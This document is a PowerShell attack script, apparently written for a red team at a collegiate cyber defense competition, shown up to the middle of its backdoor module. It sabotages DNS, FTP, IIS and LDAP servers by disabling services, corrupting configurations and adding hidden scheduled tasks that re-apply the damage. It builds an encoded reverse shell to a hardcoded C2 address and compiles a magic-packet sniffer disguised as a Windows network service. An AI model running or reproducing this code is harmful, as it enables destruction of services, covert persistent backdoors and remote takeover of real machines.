# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Phase 2 — P2_COMBINED
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#
# Single-file interactive wrapper for all Phase 2 Windows attack modules.
# Download once, run on any target — no external script dependencies.
#
# MODULES (canonical execution order):
#   1. ServiceSmasher   T1489       3-layer service sabotage (DNS/FTP/IIS/LDAP)
#   2. WhosThere        T1205.001   Magic-packet backdoor (compiles C# sniffer EXE)
#   3. BackgroundBeef   T1197       Self-healing BITS persistence loop
#   4. ChocolateFactory T1072       Weaponized Chocolatey delivery (needs target internet)
#   5. MemoryHole       T1070       Evidence eraser — ALWAYS run last
#
# USAGE:
#   Interactive menu:         .\CCDC_Windows_P2_COMBINED.ps1
#   Run specific modules:     .\CCDC_Windows_P2_COMBINED.ps1 -Modules ServiceSmasher,BackgroundBeef
#   Run all in order:         .\CCDC_Windows_P2_COMBINED.ps1 -All
#   Show completion status:   .\CCDC_Windows_P2_COMBINED.ps1 -Status
#   Skip already-done:        .\CCDC_Windows_P2_COMBINED.ps1 -All -Resume
#   Re-run even if done:      .\CCDC_Windows_P2_COMBINED.ps1 -All -Force
#
# REQUIREMENTS: PowerShell 5.1+, Administrator, Windows Server 2016/2019/2022
#
# NOTE: WhosThere requires internet access on the target to download Npcap
#       (has raw-socket fallback if Npcap unavailable).
#       ChocolateFactory requires internet to install Chocolatey if not present.
#
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator
#Requires -Version 5.1

[CmdletBinding()]
param(
    [string[]] $Modules = @(),
    [switch]   $All,
    [switch]   $Status,
    [switch]   $Resume,
    [switch]   $Force
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

# =============================================================================
#region OPERATOR CONFIG — Fill ALL values before running
# =============================================================================

$RedTeamIP             = "172.31.40.6"          # C2 IP — WhosThere, BackgroundBeef, ChocolateFactory

$WhosThere_Port        = 4449                # WhosThere reverse shell callback port
$WhosThere_Magic       = @(0xDE, 0xAD, 0xBE, 0xEF)  # Magic bytes that trigger WhosThere

$BackgroundBeef_Port   = 4450                # BackgroundBeef reverse shell callback port
$BackgroundBeef_C2     = ""                  # Optional C2 URL for BITS payload download
                                             # Leave "" for local UNC mode (offline-safe)

$ChocolateFactory_Port = 4452                # ChocolateFactory reverse shell callback port

$MemoryHole_Pass       = "12345678"          # MemoryHole passphrase — anti-accident guardrail

#endregion

# =============================================================================
# STATE TRACKING
# =============================================================================

$StateFile = "C:\Windows\System32\spool\drivers\color\.p2_state.csv"

$_ModuleOrder = @("ServiceSmasher","WhosThere","BackgroundBeef","ChocolateFactory","MemoryHole")

# Module display names and notes (shown in menu)
$_ModuleMeta = [ordered]@{
    ServiceSmasher   = "T1489 DNS/FTP/IIS/LDAP 3-layer"
    WhosThere        = "T1205 Magic-packet backdoor"
    BackgroundBeef   = "T1197 BITS persistence loop"
    ChocolateFactory = "T1072 Chocolatey deploy"
    MemoryHole       = "T1070 Evidence eraser (LAST)"
}

function Read-StateFile {
    $tbl = @{}
    if (Test-Path $StateFile) {
        try {
            Import-Csv -Path $StateFile -ErrorAction Stop | ForEach-Object {
                $tbl[$_.Module] = [pscustomobject]@{
                    Status    = $_.Status
                    Timestamp = $_.Timestamp
                    Notes     = $_.Notes
                }
            }
        } catch {}
    }
    return $tbl
}

function Write-StateFile {
    param([hashtable]$Table)
    try {
        $rows = $_ModuleOrder | ForEach-Object {
            $m = $_
            $e = $Table[$m]
            if ($e) {
                [pscustomobject]@{ Module=$m; Status=$e.Status; Timestamp=$e.Timestamp; Notes=$e.Notes }
            } else {
                [pscustomobject]@{ Module=$m; Status=""; Timestamp=""; Notes="" }
            }
        }
        $rows | Export-Csv -Path $StateFile -NoTypeInformation -Force -ErrorAction Stop
    } catch {
        Write-Host "[-] Could not write state file: $_" -ForegroundColor Red
    }
}

function Set-ModuleState {
    param([string]$Module, [string]$Status, [string]$Notes = "")
    $tbl = Read-StateFile
    $tbl[$Module] = [pscustomobject]@{
        Status    = $Status
        Timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss")
        Notes     = $Notes
    }
    Write-StateFile $tbl
}

# =============================================================================
# COLOUR HELPERS
# =============================================================================

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m) Write-Host "`n==[ $m ]==" -ForegroundColor Magenta }

# =============================================================================
# BANNER
# =============================================================================

function Show-Banner {
    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor Red
    Write-Host "  ____  ____     ____  ___  __  __ ____ ___ _   _ _____  ____" -ForegroundColor Red
    Write-Host " |  _ \|___ \   / ___|/ _ \|  \/  | __ )_ _| \ | | ____|  _ \" -ForegroundColor Red
    Write-Host " | |_) | __) | | |  _| | | | |\/| |  _ \| ||  \| |  _| | | | |" -ForegroundColor Red
    Write-Host " |  __/ / __/  | |_| | |_| | |  | | |_) | || |\  | |___| |_| |" -ForegroundColor Red
    Write-Host " |_|   |_____|  \____|\___/|_|  |_|____/___|_| \_|_____|____/" -ForegroundColor Red
    Write-Host ""
    Write-Host "   Phase 2 Combined — Windows Attack Modules"    -ForegroundColor Yellow
    Write-Host "   5 modules. One script. Run once."             -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red
    Write-Host ""
}

# =============================================================================
# MENU & STATUS
# =============================================================================

function Get-StatusLabel {
    param([string]$Status)
    switch ($Status) {
        "SUCCESS" { return "[DONE] " }
        "FAILED"  { return "[FAIL] " }
        "RUNNING" { return "[ RUN] " }
        default   { return "[    ] " }
    }
}

function Show-Status {
    $state = Read-StateFile
    Write-Host ""
    Write-Host "  P2_COMBINED — Module Status" -ForegroundColor Cyan
    Write-Host "  State file: $StateFile" -ForegroundColor DarkGray
    Write-Host ""
    $fmt = "  {0,-5} {1,-7} {2,-16} {3,-22} {4}"
    Write-Host ($fmt -f "#", "Status", "Module", "Timestamp", "Notes") -ForegroundColor White
    Write-Host ($fmt -f "-", "------", "------", "---------", "-----") -ForegroundColor DarkGray
    for ($i = 0; $i -lt $_ModuleOrder.Count; $i++) {
        $m   = $_ModuleOrder[$i]
        $e   = $state[$m]
        $lbl = if ($e) { $e.Status } else { "" }
        $ts  = if ($e) { $e.Timestamp } else { "" }
        $nt  = if ($e) { $e.Notes } else { "" }
        $col = switch ($lbl) {
            "SUCCESS" { "Green"  }
            "FAILED"  { "Red"    }
            default   { "Gray"   }
        }
        Write-Host ($fmt -f ($i+1), $lbl, $m, $ts, $nt) -ForegroundColor $col
    }
    Write-Host ""
}

function Show-Menu {
    param([hashtable]$State)
    $n = $_ModuleOrder.Count
    Write-Host ""
    Write-Host "  ╔════════════════════════════════════════════════════════════════╗" -ForegroundColor DarkCyan
    Write-Host "  ║  P2_COMBINED — Select Modules to Run                           ║" -ForegroundColor DarkCyan
    Write-Host "  ╠════════════════════════════════════════════════════════════════╣" -ForegroundColor DarkCyan
    for ($i = 0; $i -lt $n; $i++) {
        $m    = $_ModuleOrder[$i]
        $e    = $State[$m]
        $lbl  = Get-StatusLabel $(if ($e) { $e.Status } else { "" })
        $desc = $_ModuleMeta[$m]
        $col  = switch ($(if ($e) { $e.Status } else { "" })) {
            "SUCCESS" { "Green"  }
            "FAILED"  { "Red"    }
            default   { "White"  }
        }
        Write-Host ("  ║  {0}  {1} {2,-18} {3,-32}║" -f ($i+1), $lbl, $m, $desc) -ForegroundColor $col
    }
    Write-Host "  ╠════════════════════════════════════════════════════════════════╣" -ForegroundColor DarkCyan
    Write-Host "  ║  Enter number(s), name(s), A=All, Q=Quit                       ║" -ForegroundColor DarkCyan
    Write-Host "  ╚════════════════════════════════════════════════════════════════╝" -ForegroundColor DarkCyan
    Write-Host ""
}

# =============================================================================
# PRE-RUN CONFIG VALIDATION
# =============================================================================

function Test-OperatorConfig {
    param([string[]]$TargetModules)
    $errors = @()
    $needsIP = @("WhosThere","BackgroundBeef","ChocolateFactory")
    if (($TargetModules | Where-Object { $needsIP -contains $_ }).Count -gt 0) {
        if ($script:RedTeamIP -eq "CHANGEME") {
            $errors += "RedTeamIP is still CHANGEME (required for: WhosThere, BackgroundBeef, ChocolateFactory)"
        }
    }
    if ($TargetModules -contains "MemoryHole") {
        if ($script:MemoryHole_Pass -eq "CHANGEME") {
            $errors += "MemoryHole_Pass is still CHANGEME (required for MemoryHole)"
        }
    }
    return $errors
}

# =============================================================================
# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 1 — ServiceSmasher  (T1489)
# ═══════════════════════════════════════════════════════════════════════════════
# =============================================================================

function Invoke-ServiceSmasher {
    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor Magenta
    Write-Host "   ServiceSmasher -- T1489 Service Sabotage (DNS/FTP/IIS/LDAP)" -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Magenta
    Write-Host ""

    $Results = @{}

    function _Get-SvcSafe {
        param([string]$Name)
        Get-Service -Name $Name -ErrorAction SilentlyContinue
    }

    function _Stop-DisableSvc {
        param([string]$Name)
        $svc = _Get-SvcSafe $Name
        if (-not $svc) { return $false }
        try { Stop-Service -Name $Name -Force -ErrorAction Stop } catch { Write-Warn "  Stop-Service $Name : $_" }
        try { Set-Service -Name $Name -StartupType Disabled -ErrorAction Stop } catch { Write-Warn "  Set-Service $Name : $_" }
        Write-Success "  L1: $Name stopped and disabled"
        return $true
    }

    function _New-FwBlock {
        param([string]$RuleName, [string]$Protocol, $LocalPort, [switch]$Outbound)
        $dir      = if ($Outbound) { "Outbound" } else { "Inbound" }
        $full     = "${RuleName}-${dir}-Red"
        $portStr  = if ($LocalPort -is [array]) { ($LocalPort -join ",") } else { "$LocalPort" }
        try {
            if (-not (Get-NetFirewallRule -DisplayName $full -ErrorAction SilentlyContinue)) {
                New-NetFirewallRule -DisplayName $full -Direction $dir `
                    -Protocol $Protocol -LocalPort $LocalPort -Action Block `
                    -ErrorAction Stop | Out-Null
            }
            Write-Success "  FW DROP $dir ${Protocol}/${portStr}"
        } catch { Write-Warn "  FW rule failed (${full}): $_" }
    }

    function _Add-RepeatingTask {
        param([string]$TaskName, [string]$Command, [string]$Arguments, [int]$IntervalMinutes = 5)
        try {
            $action   = New-ScheduledTaskAction -Execute $Command -Argument $Arguments
            $trigger  = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes $IntervalMinutes) `
                            -Once -At (Get-Date)
            $settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 1) `
                            -MultipleInstances IgnoreNew -Hidden
            Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger `
                -Settings $settings -RunLevel Highest -Force -ErrorAction Stop | Out-Null
            Write-Success "  Scheduled task: $TaskName (every ${IntervalMinutes} min)"
        } catch { Write-Warn "  Scheduled task failed (${TaskName}): $_" }
    }

    # ── DNS ───────────────────────────────────────────────────────────────────
    Write-Section "DNS Server"
    if (-not (_Get-SvcSafe "DNS")) {
        Write-Warn "DNS service not found — skipping"
    } else {
        _Stop-DisableSvc "DNS" | Out-Null
        try {
            $r = "HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters"
            if (-not (Test-Path $r)) { New-Item -Path $r -Force | Out-Null }
            Set-ItemProperty -Path $r -Name "ListenAddresses" -Value "127.0.0.99" -Type String
            Write-Success "DNS L1: ListenAddresses = 127.0.0.99 (nonexistent NIC)"
        } catch { Write-Warn "DNS L1 registry: $_" }
        $Results["DNS_L1"] = "OK"

        $dnsDir = "$env:windir\System32\dns"
        if (Test-Path $dnsDir) {
            Get-ChildItem -Path $dnsDir -Filter "*.dns" -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    $orig = "$($_.FullName).orig"
                    if (-not (Test-Path $orig)) { Copy-Item $_.FullName $orig -Force }
                    $ts = Get-Date -Format "u"
                    $crlf = [char]13 + [char]10
                    $broken = "; BROKEN - system maintenance " + $ts + $crlf + "@ 0 IN SOA . . ( 0 0 0 0 0 )" + $crlf
                    Set-Content -Path $_.FullName -Value ($broken + (Get-Content $_.FullName -Raw)) -Encoding ASCII
                    Write-Success "DNS L2: corrupted zone: $($_.Name)"
                } catch { Write-Warn "DNS L2: $($_.Name): $_" }
            }
            $cacheFile = Join-Path $dnsDir "cache.dns"
            if (Test-Path $cacheFile) {
                if (-not (Test-Path "$cacheFile.orig")) { Copy-Item $cacheFile "$cacheFile.orig" -Force }
                Set-Content -Path $cacheFile -Value "; root hints cleared" -Encoding ASCII
                Write-Success "DNS L2: root hints cleared"
            }
        }
        $Results["DNS_L2"] = "OK"

        _New-FwBlock "DNS" "UDP" 53; _New-FwBlock "DNS" "TCP" 53
        _New-FwBlock "DNS" "UDP" 53 -Outbound; _New-FwBlock "DNS" "TCP" 53 -Outbound
        if (Test-Path $dnsDir) {
            try { & icacls "$dnsDir" /deny "NETWORK SERVICE:(OI)(CI)F" 2>&1 | Out-Null } catch {}
        }
        $dnsCmd = "Stop-Service DNS -Force -EA SilentlyContinue; Set-Service DNS -StartupType Disabled -EA SilentlyContinue; Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters' -Name 'ListenAddresses' -Value '127.0.0.99' -EA SilentlyContinue"
        _Add-RepeatingTask "CCDC-DNS-Redeploy" "powershell.exe" "-NonInteractive -NoProfile -WindowStyle Hidden -Command `"$dnsCmd`"" 5
        $Results["DNS_L3"] = "OK"
    }

    # ── FTP ───────────────────────────────────────────────────────────────────
    Write-Section "IIS FTP"
    $ftpSvcName = if (_Get-SvcSafe "FTPSVC") { "FTPSVC" } elseif (_Get-SvcSafe "MSFTPSVC") { "MSFTPSVC" } else { $null }
    if (-not $ftpSvcName) {
        Write-Warn "FTP service not found — skipping"
    } else {
        $appcmd = "$env:windir\system32\inetsrv\appcmd.exe"
        $ahc    = "$env:windir\system32\inetsrv\config\applicationHost.config"
        _Stop-DisableSvc $ftpSvcName | Out-Null
        if (Test-Path $appcmd) { & $appcmd stop site /site.name:"Default FTP Site" 2>&1 | Out-Null }
        $Results["FTP_L1"] = "OK"

        if (Test-Path $appcmd) {
            & $appcmd set site /site.name:"Default FTP Site" /bindings:"ftp/192.0.2.1:21:" 2>&1 | Out-Null
            Write-Success "FTP L2: binding → 192.0.2.1:21 (nonroutable)"
            & $appcmd clear config -section:system.ftpServer/security/authorization 2>&1 | Out-Null
            Write-Success "FTP L2: authorization rules cleared"
        }
        if (Test-Path $ahc) {
            try {
                if (-not (Test-Path "$ahc.orig")) { Copy-Item $ahc "$ahc.orig" -Force }
                $xml = [xml](Get-Content $ahc -Raw)
                $ftpAuth = $xml.SelectSingleNode("//system.ftpServer/security/authentication/basicAuthentication")
                if ($ftpAuth) { $ftpAuth.SetAttribute("enabled","false"); $xml.Save($ahc); Write-Success "FTP L2: basicAuthentication disabled" }
            } catch { Write-Warn "FTP L2 config: $_" }
        }
        $Results["FTP_L2"] = "OK"

        _New-FwBlock "FTP-Control" "TCP" 21; _New-FwBlock "FTP-Passive" "TCP" 50000
        $ftpRoot = "$env:systemdrive\inetpub\ftproot"
        if (Test-Path $ftpRoot) { try { & icacls $ftpRoot /deny "Everyone:(OI)(CI)F" 2>&1 | Out-Null } catch {} }
        $ftpCmd = "Stop-Service $ftpSvcName -Force -EA SilentlyContinue; Set-Service $ftpSvcName -StartupType Disabled -EA SilentlyContinue"
        _Add-RepeatingTask "CCDC-FTP-Redeploy" "powershell.exe" "-NonInteractive -NoProfile -WindowStyle Hidden -Command `"$ftpCmd`"" 5
        $Results["FTP_L3"] = "OK"
    }

    # ── IIS ───────────────────────────────────────────────────────────────────
    Write-Section "IIS Web Server (W3SVC)"
    if (-not (_Get-SvcSafe "W3SVC")) {
        Write-Warn "W3SVC not found — skipping"
    } else {
        $ahc     = "$env:windir\system32\inetsrv\config\applicationHost.config"
        $wwwroot = "$env:systemdrive\inetpub\wwwroot"
        _Stop-DisableSvc "W3SVC" | Out-Null
        try { & iisreset /stop 2>&1 | Out-Null } catch {}
        $Results["IIS_L1"] = "OK"

        if (Test-Path $ahc) {
            try {
                if (-not (Test-Path "$ahc.orig")) { Copy-Item $ahc "$ahc.orig" -Force }
                $xml = [xml](Get-Content $ahc -Raw)
                foreach ($b in $xml.SelectNodes("//site[@name='Default Web Site']/bindings/binding")) {
                    if ($b.GetAttribute("bindingInformation") -match ":80:") {
                        $b.SetAttribute("bindingInformation","192.0.2.1:80:")
                        Write-Success "IIS L2: Default Web Site binding → 192.0.2.1:80 (nonroutable)"
                    }
                }
                foreach ($pm in $xml.SelectNodes("//applicationPool[@name='DefaultAppPool']/processModel")) {
                    $bogus = "CCDC_Bogus_$(Get-Random -Maximum 99999)"
                    $pm.SetAttribute("userName",$bogus); $pm.SetAttribute("password","!"); $pm.SetAttribute("identityType","SpecificUser")
                    Write-Success "IIS L2: DefaultAppPool identity → invalid user $bogus"
                }
                $xml.Save($ahc)
            } catch { Write-Warn "IIS L2 config: $_" }
        }
        if (Test-Path $wwwroot) {
            $webCfg = Join-Path $wwwroot "web.config"
            if (Test-Path $webCfg) { Copy-Item $webCfg "$webCfg.orig" -Force -ErrorAction SilentlyContinue }
            $broken = @"
<?xml version="1.0" encoding="UTF-8"?>
<configuration><system.webServer><modules>
  <add name="MandatorySecurityModule" type="System.Web.Security.BrokenHttpModule, SecurityOverrides, Version=1.0.0.0" />
</modules></system.webServer></configuration>
"@
            Set-Content -Path $webCfg -Value $broken -Encoding UTF8
            Write-Success "IIS L2: broken web.config planted in wwwroot"
        }
        $Results["IIS_L2"] = "OK"

        _New-FwBlock "IIS-HTTP" "TCP" 80; _New-FwBlock "IIS-HTTPS" "TCP" 443
        if (Test-Path $wwwroot) {
            try {
                & icacls $wwwroot /deny "IIS_IUSRS:(OI)(CI)R" 2>&1 | Out-Null
                & icacls $wwwroot /deny "IUSR:(OI)(CI)R"      2>&1 | Out-Null
                Write-Success "IIS L3: IIS_IUSRS and IUSR denied read on wwwroot"
            } catch {}
        }
        _Add-RepeatingTask "CCDC-IIS-Redeploy" "powershell.exe" "-NonInteractive -NoProfile -WindowStyle Hidden -Command `"Stop-Service W3SVC -Force -EA SilentlyContinue; Set-Service W3SVC -StartupType Disabled -EA SilentlyContinue`"" 5
        $Results["IIS_L3"] = "OK"
    }

    # ── LDAP ──────────────────────────────────────────────────────────────────
    Write-Section "LDAP / Active Directory"
    _New-FwBlock "LDAP"    "TCP" 389; _New-FwBlock "LDAP"    "UDP" 389
    _New-FwBlock "LDAPS"   "TCP" 636; _New-FwBlock "LDAP-GC" "TCP" 3268; _New-FwBlock "LDAP-GC" "TCP" 3269
    $Results["LDAP_L1"] = "OK"

    $ntdsParams = "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"
    if (-not (Test-Path $ntdsParams)) { try { New-Item -Path $ntdsParams -Force | Out-Null } catch {} }
    @{ MaxConnections=1; MaxConnIdleTime=1; MaxPageSize=1; MaxQueryDuration=1; MaxTempTableSize=1 }.GetEnumerator() | ForEach-Object {
        try { Set-ItemProperty -Path $ntdsParams -Name $_.Key -Value $_.Value -Type DWord -Force } catch { Write-Warn "LDAP L2 $($_.Key): $_" }
    }
    Write-Success "LDAP L2: NTDS policy degraded (MaxConnections/PageSize/QueryDuration = 1)"
    $Results["LDAP_L2"] = "OK"

    try { Set-ItemProperty -Path $ntdsParams -Name "LDAPServerIntegrity"        -Value 2 -Type DWord -Force } catch {}
    try { Set-ItemProperty -Path $ntdsParams -Name "LdapEnforceChannelBinding"  -Value 2 -Type DWord -Force } catch {}
    Write-Success "LDAP L3: require signing + channel binding"
    $Results["LDAP_L3"] = "OK"

    # ── Summary ───────────────────────────────────────────────────────────────
    Write-Section "ServiceSmasher Summary"
    $fmt = "{0,-20} {1,-10} {2,-10} {3,-10}"
    Write-Host ($fmt -f "Service","Layer 1","Layer 2","Layer 3")
    foreach ($svc in @("DNS","FTP","IIS","LDAP")) {
        $l1 = if ($Results["${svc}_L1"]) { "OK" } else { "SKIP" }
        $l2 = if ($Results["${svc}_L2"]) { "OK" } else { "SKIP" }
        $l3 = if ($Results["${svc}_L3"]) { "OK" } else { "SKIP" }
        Write-Host ($fmt -f $svc, $l1, $l2, $l3)
    }
}

# =============================================================================
# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 2 — WhosThere  (T1205.001)
# ═══════════════════════════════════════════════════════════════════════════════
# =============================================================================

function Invoke-WhosThere {
    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor Red
    Write-Host "     WhosThere -- T1205 Traffic Signaling Backdoor" -ForegroundColor Yellow
    Write-Host "     No open ports. Magic packet triggers reverse shell." -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red
    Write-Host ""

    $WTS_IP    = $script:RedTeamIP
    $WTS_Port  = $script:WhosThere_Port
    $WTS_Magic = $script:WhosThere_Magic

    $ServiceName    = "NdisFilterHelper"
    $ServiceDisplay = "Network Driver Interface Specification Filter Helper"
    $ServiceDesc    = "Provides filter arbitration and management services for Network Driver Interface Specification (NDIS) protocol drivers. If this service is stopped, network filtering may be impaired."
    $ExePath        = "C:\Windows\System32\ndisflt.exe"
    $NpcapInstPath  = "$env:TEMP\npcap-setup.exe"
    $NpcapUrl       = "https://npcap.com/dist/npcap-1.79.exe"

    # ── Section 1: Npcap ──────────────────────────────────────────────────────
    Write-Section "WhosThere 1/5  Npcap Installation"
    $npcapPresent = (Test-Path "C:\Windows\System32\Npcap\wpcap.dll") -or (Test-Path "C:\Windows\System32\wpcap.dll")
    if ($npcapPresent) {
        Write-Warn "Npcap/WinPcap already installed — skipping"
    } else {
        Write-Info "Downloading Npcap from $NpcapUrl ..."
        try {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            (New-Object Net.WebClient).DownloadFile($NpcapUrl, $NpcapInstPath)
            Write-Info "Installing Npcap silently..."
            $proc = Start-Process -FilePath $NpcapInstPath -ArgumentList "/S /winpcap_mode /loopback_support=yes /dot11_support=no" -Wait -PassThru -WindowStyle Hidden
            if ($proc.ExitCode -ne 0) { Write-Warn "Npcap installer exited $($proc.ExitCode) — may still work if WinPcap present" }
            else { Write-Success "Npcap installed" }
            Remove-Item -Path $NpcapInstPath -Force -ErrorAction SilentlyContinue
        } catch { Write-Warn "Npcap download/install failed: $_ — continuing with raw socket fallback" }
    }
    $WpcapPath = "C:\Windows\System32\Npcap\wpcap.dll"
    if (-not (Test-Path $WpcapPath)) { $WpcapPath = "C:\Windows\System32\wpcap.dll" }
    if (-not (Test-Path $WpcapPath)) { $WpcapPath = "" }
    Write-Info "wpcap.dll: $(if ($WpcapPath) { $WpcapPath } else { 'not found — raw socket fallback' })"

    # ── Section 2: Payload ────────────────────────────────────────────────────
    Write-Section "WhosThere 2/5  Building Reverse Shell Payload"
    $RawShell = @"
`$c=New-Object Net.Sockets.TCPClient('$WTS_IP',$WTS_Port);`$s=`$c.GetStream();[byte[]]`$b=0..65535|%{0};while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){`$d=(New-Object Text.ASCIIEncoding).GetString(`$b,0,`$i);`$r=(iex `$d 2>&1|Out-String);`$sb=[Text.Encoding]::ASCII.GetBytes(`$r);`$s.Write(`$sb,0,`$sb.Length)};`$c.Close()
"@
    $EncodedShell = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($RawShell))
    Write-Success "Payload encoded (${WTS_IP}:${WTS_Port})"

    # ── Section 3: Compile C# Sniffer Service ─────────────────────────────────
    Write-Section "WhosThere 3/5  Compiling Sniffer Service"
    $MagicHex = ($WTS_Magic | ForEach-Object { "0x{0:X2}" -f $_ }) -join ", "
    $CSharpSource = @"
using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;

public class NdisFilterService : ServiceBase
{
    private Thread _snifferThread;
    private volatile bool _running = false;
    private static readonly byte[] Magic = new byte[] { $MagicHex };
    private const string C2Ip   = "$WTS_IP";
    private const int    C2Port = $WTS_Port;
    private const string ShellB64 = "$EncodedShell";

    public NdisFilterService() { ServiceName = "$ServiceName"; CanStop = true; CanPauseAndContinue = false; AutoLog = false; }

    protected override void OnStart(string[] args) { _running = true; _snifferThread = new Thread(SniffLoop) { IsBackground = true, Name = "NdisSniff" }; _snifferThread.Start(); }
    protected override void OnStop() { _running = false; _snifferThread?.Join(2000); }

    private void SniffLoop()
    {
        try
        {
            IPAddress bindAddr = IPAddress.Any;
            foreach (System.Net.NetworkInformation.NetworkInterface ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
            {
                foreach (System.Net.NetworkInformation.UnicastIPAddressInformation ua in ni.GetIPProperties().UnicastAddresses)
                {
                    if (ua.Address.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(ua.Address)) { bindAddr = ua.Address; break; }
                }
                if (!bindAddr.Equals(IPAddress.Any)) break;
            }
            Socket raw = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
            raw.Bind(new IPEndPoint(bindAddr, 0));
            raw.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
            byte[] inBuf = BitConverter.GetBytes(1); byte[] outBuf = new byte[4];
            raw.IOControl(unchecked((int)0x98000001), inBuf, outBuf);
            byte[] buf = new byte[65535];
            while (_running)
            {
                try
                {
                    int received = raw.Receive(buf);
                    if (received < 28) continue;
                    int ipHdrLen = (buf[0] & 0x0F) * 4;
                    if (received < ipHdrLen + 8) continue;
                    if (buf[9] != 17) continue;
                    int udpPayloadOffset = ipHdrLen + 8;
                    int udpPayloadLen    = received - udpPayloadOffset;
                    if (udpPayloadLen < Magic.Length) continue;
                    if (HasMagic(buf, udpPayloadOffset, udpPayloadLen)) { new Thread(FireShell) { IsBackground = true }.Start(); }
                }
                catch { }
            }
            raw.Close();
        }
        catch { }
    }

    private bool HasMagic(byte[] buf, int offset, int len) { if (len < Magic.Length) return false; for (int i = 0; i < Magic.Length; i++) if (buf[offset + i] != Magic[i]) return false; return true; }
    private void FireShell() { try { Thread.Sleep(500); Process.Start(new ProcessStartInfo { FileName = "powershell.exe", Arguments = "-NoP -NonI -W Hidden -Exec Bypass -Enc " + ShellB64, UseShellExecute = false, CreateNoWindow = true }); } catch { } }

    public static void Main(string[] args) { ServiceBase.Run(new NdisFilterService()); }
}
"@

    $CompilerParams = New-Object System.CodeDom.Compiler.CompilerParameters
    $CompilerParams.GenerateExecutable  = $true
    $CompilerParams.OutputAssembly      = $ExePath
    $CompilerParams.CompilerOptions     = "/optimize+ /platform:x64"
    $fwDir = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
    $CompilerParams.ReferencedAssemblies.AddRange(@(
        [System.Reflection.Assembly]::Load("System").Location,
        [System.Reflection.Assembly]::Load("System.Net").Location,
        (Join-Path $fwDir "System.ServiceProcess.dll"),
        (Join-Path $fwDir "System.dll")
    ))

    $existingSvc = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if ($existingSvc) {
        Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
        & sc.exe delete $ServiceName | Out-Null
        Start-Sleep -Seconds 2
    }
    if (Test-Path $ExePath) { Remove-Item -Path $ExePath -Force -ErrorAction SilentlyContinue }

    $Provider = New-Object Microsoft.CSharp.CSharpCodeProvider
    $Result   = $Provider.CompileAssemblyFromSource($CompilerParams, $CSharpSource)
    if ($Result.Errors.Count -gt 0) {
        Write-Err "Compilation failed:"
        $Result.Errors | ForEach-Object { Write-Err "  $_" }
        throw "WhosThere compilation failed"
    }
    Write-Success "Sniffer compiled: $ExePath ($([Math]::Round((Get-Item $ExePath).Length / 1KB, 1)) KB)"

    # ── Section 4: Harden ─────────────────────────────────────────────────────
    Write-Section "WhosThere 4/5  Hardening"
    try { attrib +H +S $ExePath 2>$null } catch {}
    try {
        & icacls $ExePath /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:(F)" 2>&1 | Out-Null
        & icacls $ExePath /deny "BUILTIN\Users:(RX)" 2>&1 | Out-Null
        Write-Success "ACL hardened: SYSTEM only"
    } catch { Write-Warn "ACL hardening failed: $_" }

    # ── Section 5: Service Registration ──────────────────────────────────────
    Write-Section "WhosThere 5/5  Service Registration"
    & sc.exe create $ServiceName binPath= "`"$ExePath`"" start= auto type= own DisplayName= "$ServiceDisplay" 2>&1 | Out-Null
    & sc.exe description $ServiceName "$ServiceDesc" 2>&1 | Out-Null
    & sc.exe failure $ServiceName reset= 86400 actions= restart/5000/restart/5000/restart/5000 2>&1 | Out-Null
    Write-Success "Service registered: $ServiceName (auto-start, restart-on-crash x3)"

